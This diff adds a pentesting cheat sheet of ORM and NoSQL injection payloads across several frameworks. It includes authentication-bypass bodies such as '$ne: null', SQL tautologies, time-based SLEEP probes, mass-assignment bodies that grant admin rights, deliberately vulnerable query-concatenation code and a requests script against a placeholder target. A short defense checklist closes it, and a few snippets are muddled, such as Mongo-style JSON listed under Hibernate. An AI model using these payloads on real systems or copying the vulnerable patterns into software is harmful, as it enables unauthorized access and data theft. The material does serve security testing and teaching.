@@ -1,0 +1,235 @@
+# ORM Injection & Leaks
+
+## ========================================
+## HIBERNATE (JAVA)
+## ========================================
+
+# HQL Injection
+from User where username = 'admin' --'
+from User where id = 1 or 1=1
+from User u where u.username = :username and u.password = :password
+
+# Criteria API manipulation
+{"id": {"$ne": null}}
+{"username": {"$ne": ""}}
+
+## ========================================
+## SEQUELIZE (NODE.JS)
+## ========================================
+
+# Query manipulation
+{where: {id: {$gt: 0}}}
+{where: {id: {$ne: null}}}
+{where: {username: {$like: '%admin%'}}}
+{where: {role: {$in: ['admin', 'superuser']}}}
+
+# findAll exploitation
+User.findAll({
+  where: {
+    id: req.body.id  // Can be manipulated
+  }
+})
+
+# Raw queries (vulnerable)
+sequelize.query("SELECT * FROM users WHERE id = " + req.params.id)
+
+## ========================================
+## DJANGO ORM (PYTHON)
+## ========================================
+
+# Query injection
+User.objects.filter(id__gte=0)
+User.objects.filter(username__startswith='a')
+User.objects.filter(email__icontains='admin')
+User.objects.extra(where=["id > 0"])
+
+# Raw SQL (vulnerable)
+User.objects.raw("SELECT * FROM users WHERE id = %s" % user_id)
+
+# Filter manipulation
+User.objects.filter(**request.GET.dict())
+
+## ========================================
+## SQLALCHEMY (PYTHON)
+## ========================================
+
+# Query manipulation
+session.query(User).filter(User.id == request.args.get('id'))
+session.query(User).filter(text("id = " + user_input))  # Vulnerable
+
+# ORM method bypass
+session.execute("SELECT * FROM users WHERE id = " + user_input)
+
+## ========================================
+## ELOQUENT (PHP/LARAVEL)
+## ========================================
+
+# Mass assignment
+User::create($request->all());  // Can set any attribute
+
+# Query manipulation
+User::where('id', $request->input('id'))->get();
+User::whereRaw("id = " . $id)->get();  # Vulnerable
+
+# SQL injection in raw queries
+DB::select("SELECT * FROM users WHERE id = " . $id);
+
+## ========================================
+## ACTIVE RECORD (RUBY ON RAILS)
+## ========================================
+
+# Mass assignment
+User.create(params[:user])  # Can set protected attributes
+
+# SQL injection
+User.where("username = '#{params[:username]}'")  # Vulnerable
+
+# Safe parameterization
+User.where("username = ?", params[:username])
+
+## ========================================
+## MONGODB/MONGOOSE
+## ========================================
+
+# NoSQL injection
+{username: 'admin', password: {$ne: null}}
+{username: {$regex: '.*'}}
+{$where: 'this.username == "admin"'}
+
+# Mongoose query injection
+User.find({username: req.body.username})
+// If req.body.username = {$ne: null}, returns all users
+
+## ========================================
+## TYPE JUGGLING IN ORM
+## ========================================
+
+# PHP/Laravel type juggling
+// Input: id[]=1
+User::find($request->input('id'));  // Expects int, gets array
+
+# JavaScript type coercion
+// Input: id[$ne]=null
+User.findOne({id: req.query.id})
+
+## ========================================
+## INFORMATION LEAKAGE
+## ========================================
+
+# Exposing model structure
+# Error messages reveal:
+- Table names
+- Column names
+- Relationships
+- Constraints
+
+# Example error:
+SQLSTATE[23000]: Integrity constraint violation: 1048 Column 'secret_field' cannot be null
+
+## ========================================
+## MASS ASSIGNMENT
+## ========================================
+
+# Unprotected attributes
+{"username": "test", "is_admin": true}
+{"role": "administrator"}
+{"credits": 999999}
+
+# Bypass intended logic
+POST /register
+{
+  "username": "hacker",
+  "password": "pass",
+  "is_admin": true  // Not intended to be set
+}
+
+## ========================================
+## BLIND ORM INJECTION
+## ========================================
+
+# Boolean-based
+User.where(id: params[:id]).first
+# Try: id=1 AND 1=1 (true)
+# Try: id=1 AND 1=2 (false)
+
+# Time-based
+User.where("id = #{id} AND (SELECT SLEEP(5))").first
+
+## ========================================
+## TESTING PAYLOADS
+## ========================================
+
+# Test for SQL injection in ORM
+id=1 OR 1=1
+id=1' OR '1'='1
+id=1) OR (1=1
+
+# Test for NoSQL injection
+{$ne: null}
+{$gt: ''}
+{$regex: '.*'}
+
+# Test mass assignment
+{"admin": true}
+{"role": "admin"}
+{"verified": true}
+
+## ========================================
+## EXPLOITATION EXAMPLES
+## ========================================
+
+# Example 1: Sequelize injection
+POST /api/users
+{"where": {"id": {"$gt": 0}}}
+# Returns all users
+
+# Example 2: Django filter bypass
+GET /api/users?id__gte=0
+# Returns all users with id >= 0
+
+# Example 3: MongoDB injection
+POST /login
+{"username": {"$ne": null}, "password": {"$ne": null}}
+# Bypasses authentication
+
+## ========================================
+## TOOLS
+## ========================================
+
+# Manual testing
+# Burp Suite
+# Custom scripts to manipulate ORM queries
+
+# Example Python test
+import requests
+payload = {"id__gte": 0}
+r = requests.get('http://target.com/api/users', params=payload)
+
+## ========================================
+## COMMON MISTAKES
+## ========================================
+
+# Using user input directly
+User.find(params[:id])
+User.objects.filter(id=request.GET['id'])
+
+# Not validating input types
+if typeof request.body.id !== 'number'
+
+# Trusting client data
+User.create(request.body)
+
+# Raw queries with concatenation
+"SELECT * FROM users WHERE id = " + id
+
+## ========================================
+## DEFENSE TESTING
+## ========================================
+
+# Verify:
+- Input validation
+- Parameterized queries
+- Type checking
+- Mass assignment protection
+- Error handling (no info leaks)
+- Least privilege database access
